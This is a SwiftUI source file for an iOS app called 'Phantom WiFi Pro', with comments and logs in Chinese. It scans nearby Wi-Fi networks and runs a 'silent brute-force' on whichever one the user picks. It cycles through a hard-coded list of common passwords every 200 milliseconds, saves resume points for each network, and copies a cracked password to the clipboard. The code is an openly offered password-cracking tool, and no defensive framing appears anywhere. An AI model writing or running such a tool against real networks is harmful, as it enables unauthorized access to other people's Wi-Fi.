import SwiftUI

struct ContentView: View {
    @State private var wifiList: [[String: Any]] = []
    @State private var isScanning: Bool = false
    @State private var isRunning: Bool = false

    @State private var targetSSID: String = ""
    @State private var targetBSSID: String = ""
    @State private var currentIndex: Int = 0
    @State private var totalDictCount: Int = 0
    @State private var logContent: String = "系统已就绪。点击刷新 Wi-Fi。\n"

    // 扩展本地高命中率字典
    @State private var dictionary: [String] = [
        "12345678", "88888888", "123456789", "11111111",
        "00000000", "1234567890", "87654321", "66666666",
        "123123123", "password", "admin123", "12344321",
        "888888888", "99999999", "520520520", "13800138000",
        "11223344", "01234567", "12345678a", "a12345678",
        "123456789a", "admin888", "wifi123456", "123456wifi"
    ]

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("周边热点 (点击自动断点续跑)")) {
                    Button(action: scanWiFi) {
                        HStack {
                            Label(isScanning ? "扫描中..." : "刷新周边 WiFi", systemImage: "wifi")
                            if isScanning { Spacer(); ProgressView() }
                        }
                    }
                    .disabled(isScanning || isRunning)

                    List(wifiList, id: \.description) { item in
                        let ssid = item["ssid"] as? String ?? "未知"
                        let bssid = item["bssid"] as? String ?? ""
                        let rssi = item["rssi"] as? NSNumber ?? 0
                        let savedIdx = PhantomEngine.getLastTriedIndex(forBSSID: bssid)

                        Button(action: {
                            self.targetSSID = ssid
                            self.targetBSSID = bssid
                            self.startCracking(ssid: ssid, bssid: bssid)
                        }) {
                            HStack {
                                VStack(alignment: .leading) {
                                    Text(ssid).font(.headline)
                                    Text(bssid).font(.caption).foregroundColor(.secondary)
                                }
                                Spacer()
                                if savedIdx > 0 {
                                    Text("续跑: \(savedIdx)").font(.caption2).foregroundColor(.orange)
                                }
                                Text("\(rssi) dBm").font(.caption2).foregroundColor(.blue)
                            }
                        }
                        .disabled(isRunning)
                    }
                }

                if isRunning {
                    Section(header: Text("实时进度")) {
                        VStack(alignment: .leading) {
                            Text("目标: \(targetSSID)").bold()
                            ProgressView(value: Double(currentIndex), total: Double(max(dictionary.count, 1)))
                            HStack {
                                Text("当前进度: \(currentIndex) / \(dictionary.count)")
                                Spacer()
                                Button("停止") { self.isRunning = false }
                                    .foregroundColor(.red)
                            }
                        }
                    }
                }

                Section(header: Text("底层执行日志")) {
                    ScrollView {
                        Text(logContent)
                            .font(.system(.caption, design: .monospaced))
                            .frame(maxWidth: .infinity, alignment: .leading)
                    }
                    .frame(height: 200)
                }
            }
            .navigationTitle("Phantom WiFi Pro")
        }
    }

    private func scanWiFi() {
        self.isScanning = true
        WiFiScanner.scanAvailableNetworks { results, _ in
            self.isScanning = false
            if let list = results, !list.isEmpty {
                self.wifiList = list
            }
        }
    }

    private func startCracking(ssid: String, bssid: String) {
        self.isRunning = true
        self.totalDictCount = dictionary.count
        let startIdx = PhantomEngine.getLastTriedIndex(forBSSID: bssid)
        self.currentIndex = startIdx >= dictionary.count ? 0 : startIdx

        self.logContent += "\n========== 启动静默爆破 ==========\n"
        self.logContent += "目标: [\(ssid)] (\(bssid))\n"
        if startIdx > 0 {
            self.logContent += "📍 检测到历史进度，从第 \(startIdx + 1) 条密码继续测试\n"
        }

        self.runStep(ssid: ssid, bssid: bssid)
    }

    private func runStep(ssid: String, bssid: String) {
        guard self.isRunning else {
            self.logContent += "⏸️ 任务已手动暂停，进度已保存。\n"
            return
        }

        guard self.currentIndex < dictionary.count else {
            self.logContent += "❌ 当前字典测试完毕，未匹配到正确密码。\n"
            PhantomEngine.saveProgressIndex(0, forBSSID: bssid) // 跑完重置
            self.isRunning = false
            return
        }

        let pwd = dictionary[self.currentIndex]
        self.logContent += "[\(self.currentIndex + 1)/\(dictionary.count)] 静默尝试: \(pwd)...\n"

        PhantomEngine.silentTryConnectBSSID(bssid, password: pwd) { success in
            if success {
                self.logContent += "\n🎉🎉🎉 [爆破成功] WiFi: \(ssid)\n"
                self.logContent += "🔑 真实密码: \(pwd)\n"
                UIPasteboard.general.string = pwd
                PhantomEngine.saveProgressIndex(0, forBSSID: bssid)
                self.isRunning = false
            } else {
                self.currentIndex += 1
                // 实时保存断点
                PhantomEngine.saveProgressIndex(self.currentIndex, forBSSID: bssid)

                // 递归进入下一条测试（间隔 200 毫秒，极速切换）
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
                    self.runStep(ssid: ssid, bssid: bssid)
                }
            }
        }
    }
}
